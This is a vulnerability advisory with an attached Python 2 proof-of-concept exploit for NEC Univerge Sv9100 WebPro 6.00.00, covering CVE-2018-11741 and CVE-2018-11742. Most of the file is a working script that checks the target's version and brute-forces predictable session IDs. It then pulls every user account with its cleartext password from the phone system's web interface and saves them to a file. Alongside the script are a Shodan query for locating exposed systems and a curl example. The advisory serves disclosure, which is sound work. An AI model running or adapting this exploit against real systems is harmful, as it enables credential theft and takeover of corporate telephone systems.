@@ -1,0 +1,178 @@
+'''
+[+] Credits: hyp3rlinx
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/NEC-UNIVERGE-WEBPRO-v6.00-PREDICTABLE-SESSIONID-CLEARTEXT-PASSWORDS.txt
+[+] ISR: ApparitionSec   
+
+
+***Greetz: indoushka | Eduardo B. 0day***
+
+
+[Vendor]
+www.necam.com
+
+
+[Affected Product Code Base]
+NEC Univerge Sv9100 WebPro - 6.00.00
+
+
+NEC Univerge WebPro, is a web-based programming tool for the NEC Switch, which is used to program corporate Telephone systems.
+
+
+Public facing installations as of Dec 1, 2018
+https://www.shodan.io/search?query=Server+Henry
+Result: 7,797 
+
+
+[Vulnerability Type(s)]
+[CVE Reference(s)]
+Predictable Session ID - CVE-2018-11741 / Cleartext Password Storage - CVE-2018-11742
+
+
+[Attack Vectors]
+Make repeated remote HTTP requests until arriving at a valid authenticated sessionId.
+
+
+Security Issue:
+================
+NEC Univerge WebPro suffers from a "Predictable Session ID" that can potentially disclose all user account information including passwords stored in clear text in the Web UI.
+Attackers can simply increment numbers until arriving at a live session, then by using a specific URI dump the entire account information for all users including the clear text passwords.
+
+e.g..
+
+curl  http://NEC-VICTIM-IP/Home.htm?sessionId=12959&GOTO(8)
+
+
+Exploit/POC:
+=============
+'''
+
+from socket import *
+import re
+
+#Univerge Sv9100 NEC WebPro : 6.00
+#Dumps user accounts and plaintext passwords stored in Web UI in Administrator Programming Password Setup' webpage
+#http://TARGET-IP/Home.htm?sessionId=12959&GOTO(8) "GOTO(8)" will retrieve all account usernames and cleartext passwords.
+
+print "NEC Univerge Sv9100 WebPro - 6.00.00 / Remote 0day Exploit POC"
+print "hyp3rlinx"
+
+
+IP=raw_input("[+] TARGET> ")
+res=''
+findme="Programming Password Setup"
+cnt=0
+tmp=False
+tmp2=False
+pwned=False
+
+#check application is NEC and vuln version
+def is_NEC_webpro(u):
+    global tmp,tmp2,cnt
+    res=''
+    cnt+=1
+    s=socket(AF_INET, SOCK_STREAM)
+    s.connect((IP,80))
+    s.send('GET '+u+' HTTP/1.1\r\nHost: '+IP+'\r\n\r\n')
+
+    while True:
+        res=s.recv(4048)
+        if res.find('</html>')!=-1:
+            break   
+    s.close()
+    
+    if re.findall(r"\bWebPro\b", res):
+        tmp=True
+        if tmp and cnt < 3:
+            is_NEC_webpro('/Login.htm')
+            if re.findall(r"\b6.00.00\b", res) and re.findall(r"\bNEC Corporation of America\b", res):
+                tmp2 = True
+            if tmp == True and tmp2 == True:
+                return True
+    return False
+
+
+
+def dump(acct):
+    file=open('NEC-Accounts.txt', 'w')
+    file.write(acct+'\n')
+    file.close()
+
+
+def breach(sid):
+    global pwned
+    try:
+        s=socket(AF_INET, SOCK_STREAM)
+        s.connect((IP,80))
+        sid=str(sid)
+        print 'trying sessid '+sid
+        s.send('GET /Home.htm?sessionId%3d'+sid+'&GOTO(8)%20HTTP/1.1\r\nHost: '+IP+'\r\n\r\n')
+    except Exception as e:
+        print str(e)
+        
+    while True:
+        res = s.recv(4096)
+        if res.find('</html>')!=-1:
+            break
+        if re.findall(r"\bProgramming Password Setup\b",res)!=-1: ## We hit an active session.
+            dump(res)
+            print res
+            pwned=True
+       
+    s.close()
+    return pwned
+
+
+def sessgen():
+    for sessid in range(1000,15000): ##test 14109
+        if breach(sessid):
+            break
+
+
+if __name__=='__main__':
+    if is_NEC_webpro('/'):
+        sessgen()
+    else:
+        print 'Not NEC or version not vuln.'
+
+'''
+Network Access:
+===============
+Remote
+
+
+Severity:
+=========
+High
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification:  May 15, 2018
+No reply
+Vendor Notification: May 18, 2018
+No reply
+Vendor Notification:  June 4, 2018
+No reply
+Mitre assign CVE: June 5, 2018
+JPCERT replies: June 6, 2018
+JPCERT shares information with NEC : June 7, 2018
+Request status : August 11, 2018
+JPCERT contact NEC : August 14, 2018
+No reply from vendor
+Request status : August 21, 2018
+JPCERT again contacts NEC : August 21, 2018
+JPCERT "vendor working on a release" : August 23 2018
+JPCERT "Vendor release October 2018" : September 12, 2018
+NEC "Requests public disclosure after December 1st." : November 19, 2018
+December 2, 2018 : Public Disclosure
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+'''
